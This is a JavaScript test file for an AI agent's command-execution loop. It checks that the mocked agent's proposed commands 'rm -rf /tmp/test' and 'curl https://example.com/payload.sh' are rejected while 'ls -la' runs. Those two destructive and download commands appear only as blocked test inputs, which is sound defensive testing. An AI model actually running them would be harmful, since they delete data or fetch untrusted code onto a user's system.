const test = require('node:test');
const assert = require('node:assert/strict');

process.env.APP_ENV = 'test';
process.env.LOG_LEVEL = 'error';

const systemExecute = require('../dist/tools/system-execute');
const { ReActLoop } = require('../dist/agents/react-loop');
const { createMessage } = require('../dist/types/message');

function registry() {
  return {
    listTools() {
      return [];
    },
    getTool() {
      return undefined;
    },
  };
}

function decision(content) {
  return createMessage({
    role: 'assistant',
    content: JSON.stringify(content),
  });
}

function providerFor(command) {
  const calls = [];
  return {
    calls,
    async chat(options) {
      calls.push(options);
      if (calls.length === 1) {
        return {
          message: decision({ action: 'execute', command, reason: 'test' }),
        };
      }
      if (calls.length === 2 && /rejected/i.test(String(options.messages?.[0]?.content ?? ''))) {
        return {
          message: decision({ action: 'direct', reason: 'blocked' }),
        };
      }
      return {
        message: createMessage({ role: 'assistant', content: 'final answer' }),
      };
    },
  };
}

test('execute action: dangerous command rm -rf is blocked', async () => {
  let called = false;
  const original = systemExecute.runSystemExecute;
  systemExecute.runSystemExecute = async () => {
    called = true;
    return { ok: true, content: 'should not run' };
  };

  try {
    const provider = providerFor('rm -rf /tmp/test');
    const loop = new ReActLoop(registry());
    await loop.run(provider, 'mock', 'cleanup files', [], 'system');

    assert.equal(called, false);
    assert.ok(
      provider.calls.some((call) => JSON.stringify(call.messages).includes('Command rejected')),
      'blocked command should be injected as rejected observation'
    );
  } finally {
    systemExecute.runSystemExecute = original;
  }
});

test('execute action: command not in allowlist is blocked', async () => {
  let called = false;
  const original = systemExecute.runSystemExecute;
  systemExecute.runSystemExecute = async () => {
    called = true;
    return { ok: true, content: 'should not run' };
  };

  try {
    const provider = providerFor('curl https://example.com/payload.sh');
    const loop = new ReActLoop(registry());
    await loop.run(provider, 'mock', 'download script', [], 'system');

    assert.equal(called, false);
    assert.ok(
      provider.calls.some((call) => JSON.stringify(call.messages).includes('Command rejected')),
      'blocked command should be injected as rejected observation'
    );
  } finally {
    systemExecute.runSystemExecute = original;
  }
});

test('execute action: allowed command "ls -la" proceeds normally', async () => {
  let called = false;
  const original = systemExecute.runSystemExecute;
  systemExecute.runSystemExecute = async () => {
    called = true;
    return { ok: true, content: 'mock ls output' };
  };

  try {
    const provider = providerFor('ls -la');
    const loop = new ReActLoop(registry());
    await loop.run(provider, 'mock', 'list files', [], 'system');

    assert.equal(called, true);
    assert.ok(
      provider.calls.some((call) => JSON.stringify(call.messages).includes('mock ls output')),
      'allowed command result should be injected as observation'
    );
  } finally {
    systemExecute.runSystemExecute = original;
  }
});
